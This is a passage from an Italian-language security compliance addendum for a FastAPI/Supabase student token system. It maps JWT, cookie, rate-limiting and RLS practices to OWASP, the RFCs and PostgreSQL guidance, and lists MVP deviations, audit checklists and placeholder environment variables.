  - Admin role check esplicito `_is_admin(payload)` in endpoint protetti
  - service_role_key limitata a backend, frontend usa anon_key

- ✅ **A02:2021 - Cryptographic Failures**:
  - Token generation: `secrets.token_urlsafe(32/64)` (256/512-bit entropy)
  - HTTPS obbligatorio: cookie Secure attribute, Traefik SSL
  - JWT signature: HS256 con SUPABASE_JWT_SECRET (no secrets hardcoded)

- ✅ **A03:2021 - Injection**:
  - Pydantic validation: request models con Field constraints
  - Parameterized queries: Supabase client auto-escaping
  - No SQL raw queries con user input

- ✅ **A04:2021 - Insecure Design**:
  - Threat model documentato (Sezione 6.3)
  - Defense in depth: multiple layers security (HttpOnly + SameSite + rate limiting)
  - Refresh token pattern vs JWT long-lived (security decision justification)

- ✅ **A05:2021 - Security Misconfiguration**:
  - Environment variables: tutte config via `.env` file, NO secrets in repo
  - Rate limiting configurabile: endpoint-specific limits tramite env vars
  - Logging strutturato: JSON format con PII sanitization

- ⚠️ **A07:2021 - Identification and Authentication Failures**:
  - Rate limiting: implementato su exchange-code, refresh-token, admin endpoints
  - Multi-factor authentication: NON implementato MVP (target studenti universitari, single-factor accettabile)

- ⚠️ **A03:2021 - Injection (XSS variant)**:
  - Framework protection: React auto-escapes JSX text
  - Output encoding: da implementare esplicitamente per `dangerouslySetInnerHTML` (NON usato MVP)
  - **Phase 2**: CSP header `Content-Security-Policy: script-src 'self'`

- ⚠️ **A08:2021 - Software and Data Integrity Failures (CSRF variant)**:
  - SameSite=Strict: implementato (browser moderni >95% coverage)
  - **Phase 2**: CSRF token per browser legacy + defense in depth

---

### PostgreSQL Best Practices

- ✅ **Partial Indexes** (PostgreSQL 18 Sezione 11.8):
  - Implementati su colonne soft delete: `WHERE is_active = TRUE`, `WHERE is_revoked = FALSE`
  - Riduzione dimensione indice 50-90%
  - Query planner compatibility: predicato match WHERE condition

- ✅ **Query Plan Optimization**:
  - Indici su colonne lookup: `token`, `created_by_id`
  - Indici composite per filtri frequenti: `(is_revoked, expires_at)`
  - EXPLAIN ANALYZE validation per query critiche

- ✅ **ON DELETE CASCADE**:
  - FK constraints: `student_token_id` references `student_tokens(id) ON DELETE CASCADE`
  - Cascade revoke: DELETE student token invalida refresh tokens associati

---

### Supabase Best Practices

- ✅ **RLS Policy Performance** (Supabase Docs):
  - SELECT wrapping: `(SELECT auth.jwt())` per caching (94.97-99.993% improvement)
  - Indici su colonne policy: dove applicabile (nel nostro caso funzioni, non colonne)

- ✅ **service_role_key Usage**:
  - Backend: operazioni admin con bypass RLS
  - Frontend: anon_key con RLS enforcement
  - **Never** expose service_role_key to frontend

- ✅ **ON DELETE CASCADE con RLS**:
  - CASCADE operations rispettano RLS quando eseguite da service_role (bypassa)
  - Garantito soft delete student token + cascade revoke refresh tokens

---

## 8. Deviazioni Giustificate da Standard (MVP Scope)

| Standard | Requisito/Best Practice | Deviazione MVP | Rationale Tecnico | Roadmap |
|----------|------------------------|----------------|-------------------|---------|
| **RFC 6749 Sezione 10.4** | Refresh token rotation: "authorization server MUST...revoke all tokens previously issued based on that authorization code" | Non implementata | Complessità race conditions (multiple tab/device simultaneous refresh), single-device target MVP | **Story 1.3.6** (Phase 2): implementare rotation con grace period |
| **OWASP CSRF Prevention** | CSRF token (synchronizer token pattern) come primary defense | Non implementato, SameSite=Strict solo | Browser moderni (>95% target audience studenti) supportano SameSite, sufficient protection | **Phase 2**: CSRF token per browser legacy (<5%) + defense in depth |
| **OWASP XSS Prevention** | Content Security Policy header obbligatorio | Non implementato | React framework protection parziale sufficiente MVP (no `dangerouslySetInnerHTML` usato), output encoding via JSX auto-escape | **Story 1.3.7** (Phase 2): CSP header `script-src 'self'`, whitelist CDN |
| **OWASP Authentication** | Distributed rate limiting (Redis) | In-memory fixed window | Single-instance VPS deployment MVP, Redis introduce complessità infra + costi | **Story 1.3.8** (Phase 2): migrazione Redis, sliding window algorithm |
| **OWASP Authentication** | Account-based rate limiting (oltre IP) | Per-IP solo | Costi implementativi, MVP target: prevent brute-force base, not sophisticated DDoS | **Phase 2**: limitare per `student_token_id` + IP (OWASP raccomandazione) |
| **PostgreSQL Performance** | Indici BRIN per timestamp columns | B-tree indexes usati | Tabelle piccole MVP (<10K righe), BRIN overhead non giustificato | **Post-MVP**: migrare a BRIN se tabelle >100K righe |

---

## 9. Reference Implementation

**Story 1.3.1** (Student Token Management System): implementazione di riferimento per pattern compliance-oriented.

**Pattern Implementati Conformi a Standard**:
1. **Refresh Token Pattern** (RFC 6749): access token 15 min + refresh token 1 anno, revocabile
2. **JWT Security** (RFC 8725, RFC 7519): algoritmo whitelist, claims validation, clock skew
3. **Cookie Security** (RFC 6265, OWASP): HttpOnly, Secure, SameSite, Path attributes
4. **RLS Optimization** (Supabase): SELECT wrapping, service_role_key usage
5. **Partial Indexes** (PostgreSQL 18): soft delete pattern optimization
6. **Rate Limiting** (OWASP): endpoint-specific limits, configurabile

**Documentazione**: `docs/stories/1.3.1-student-token-management-system.md` (Version 0.3)

**Applicabilità**: Pattern riutilizzabili per tutte implementazioni authentication/authorization nel progetto.

---

## 10. Security Audit Checklist

### Pre-Deployment Audit

#### JWT Implementation
- [ ] Algoritmo whitelist `HS256` configurato in `jwt.decode()`
- [ ] Claims `exp`, `iat` validati con `options={"require": ["exp", "iat"]}`
- [ ] Clock skew leeway configurato: `CLOCK_SKEW_LEEWAY_SECONDS=120` in `.env`
- [ ] OAuth 2.0 error codes implementati: `invalid_grant`, `invalid_request` format
- [ ] JWT secret rotazione pianificata (ogni 6 mesi recommended)

#### Cookie Security
- [ ] HttpOnly attribute set in `response.set_cookie(httponly=True)`
- [ ] Secure attribute set (HTTPS only): `secure=True`
- [ ] SameSite=Strict set: `samesite="strict"`
- [ ] Path attribute restrictive: `path="/api/v1/auth/refresh-token"`
- [ ] Output encoding implementato per tutti user-generated content (XSS primary mitigation)
- [ ] `dangerouslySetInnerHTML` NON usato (o sanitized con DOMPurify se necessario)

#### Database Optimization
- [ ] RLS policies implementate con SELECT wrapping: `(SELECT auth.jwt())`
- [ ] Partial indexes creati su colonne soft delete: `WHERE is_active = TRUE`
- [ ] EXPLAIN ANALYZE eseguito su query critiche (target: <50ms P95)
- [ ] ON DELETE CASCADE verificato: delete parent invalida child records

#### Rate Limiting
- [ ] Endpoint-specific limits configurati in `.env`:
  - `EXCHANGE_CODE_RATE_LIMIT_MAX_REQUESTS=10`
  - `REFRESH_TOKEN_RATE_LIMIT_MAX_REQUESTS=60`
  - `ADMIN_CREATE_TOKEN_RATE_LIMIT_MAX_REQUESTS=10`
- [ ] Lockout duration configurato per endpoint admin (exponential backoff)
- [ ] Logging eventi throttling per monitoring: `event: "rate_limit_exceeded"`
- [ ] 429 Too Many Requests response testata (E2E test)

#### Threat Model Coverage
- [ ] XSS mitigations documentate: output encoding checklist, CSP roadmap Phase 2
- [ ] CSRF mitigations documentate: SameSite browser coverage, token roadmap Phase 2
- [ ] Attack scenarios testati: XSS authenticated request, CSRF cross-site, token replay
- [ ] Penetration testing pianificato: external security audit pre-production
- [ ] Incident response plan documentato: breach detection, token revocation procedure

---

### Runtime Monitoring

#### Security Metrics
- [ ] Rate limit events tracked: count per endpoint, trend analysis
- [ ] Failed authentication attempts: threshold alerting (>10 failures/min)
- [ ] Token revocations: admin audit log, reason tracking
- [ ] Refresh token usage patterns: detect anomalies (frequency, IP changes)
- [ ] Database slow queries: EXPLAIN ANALYZE automated, alert on >100ms P95

#### Logging & Alerting
- [ ] JSON structured logs: `event`, `user_id`, `timestamp`, `ip_address`
- [ ] PII sanitization: hash `user_id`, mask email, redact tokens from logs
- [ ] Log retention: 90 days minimum (compliance), immutable storage
- [ ] Alert thresholds:
  - Rate limit exceeded: >5 events/min per endpoint
  - Failed auth: >10 attempts/min per IP
  - Token revocation spike: >10 revokes/hour
  - Database performance: P95 latency >100ms

---

## 11. Environment Variables Reference

### JWT Security (RFC 8725, RFC 7519)

```bash
# apps/api/.env

# JWT Secret (HS256 algorithm)
SUPABASE_JWT_SECRET=super-secret-jwt-key-256-bit-minimum

# JWT Issuer (RFC 7519)
SUPABASE_JWT_ISSUER=https://project-ref.supabase.co/auth/v1

# Access Token Duration (minutes)
TEMP_JWT_EXPIRES_MINUTES=15

# Clock Skew Tolerance (seconds) - RFC 7519
CLOCK_SKEW_LEEWAY_SECONDS=120  # ±2 minuti
```

### Rate Limiting (OWASP)

```bash
# Endpoint: POST /api/v1/auth/exchange-code
EXCHANGE_CODE_RATE_LIMIT_WINDOW_SEC=60
EXCHANGE_CODE_RATE_LIMIT_MAX_REQUESTS=10

# Endpoint: POST /api/v1/auth/refresh-token
REFRESH_TOKEN_RATE_LIMIT_WINDOW_SEC=3600  # 1 ora
REFRESH_TOKEN_RATE_LIMIT_MAX_REQUESTS=60

# Endpoint: POST /api/v1/admin/student-tokens
ADMIN_CREATE_TOKEN_RATE_LIMIT_WINDOW_SEC=3600
ADMIN_CREATE_TOKEN_RATE_LIMIT_MAX_REQUESTS=10
```

### Supabase (RLS, service_role_key)

```bash
# Supabase Configuration
SUPABASE_URL=https://project-ref.supabase.co
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...  # Bypassa RLS
SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...  # Soggetta a RLS
```

---

## 12. Change Log

| Date | Version | Description | Author |
|---|---|---|---|
| 2025-10-08 | 1.0 | Creazione addendum security standards compliance. Integrazione RFC (6749/7519/8725/6265), OWASP Top 10, PostgreSQL 18, Supabase Docs. Materiale consolidato da Story 1.3.1 come reference implementation. Sezioni: JWT security, cookie security, RLS optimization, partial indexes, rate limiting, threat model, compliance checklist, deviazioni giustificate MVP, security audit checklist, environment variables. | Architect |

---

## 13. References

### RFC Standards
- **RFC 6749**: OAuth 2.0 Authorization Framework - https://datatracker.ietf.org/doc/html/rfc6749
- **RFC 7519**: JSON Web Token (JWT) - https://datatracker.ietf.org/doc/html/rfc7519
- **RFC 8725**: JSON Web Token Best Current Practices - https://datatracker.ietf.org/doc/html/rfc8725
- **RFC 6265**: HTTP State Management Mechanism (Cookies) - https://datatracker.ietf.org/doc/html/rfc6265
- **RFC 6265bis** (draft): Same-Site Cookie Attribute - https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis
- **RFC 9068**: JSON Web Token (JWT) Profile for OAuth 2.0 Access Tokens - https://datatracker.ietf.org/doc/html/rfc9068

### OWASP Resources
- **OWASP Top 10 (2021)**: https://owasp.org/www-project-top-ten/
- **OWASP Session Management Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- **OWASP XSS Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **OWASP CSRF Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- **OWASP Authentication Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html

### Vendor Documentation
- **PostgreSQL 18 Documentation**: https://www.postgresql.org/docs/18/ (Sezione 11.8: Partial Indexes)
- **Supabase RLS Performance**: https://supabase.com/docs/guides/database/postgres/row-level-security
- **Supabase Auth Documentation**: https://supabase.com/docs/guides/auth
- **FastAPI Security**: https://fastapi.tiangolo.com/tutorial/security/
- **Redis Rate Limiting**: https://redis.io/glossary/rate-limiting/

### Project Documentation
- **Story 1.3.1**: `docs/stories/1.3.1-student-token-management-system.md` (Reference implementation)
- **FastAPI Best Practices**: `docs/architecture/addendum-fastapi-best-practices.md`
- **Sezione 10 Sicurezza**: `docs/architecture/sezione-10-sicurezza-e-performance.md`

---

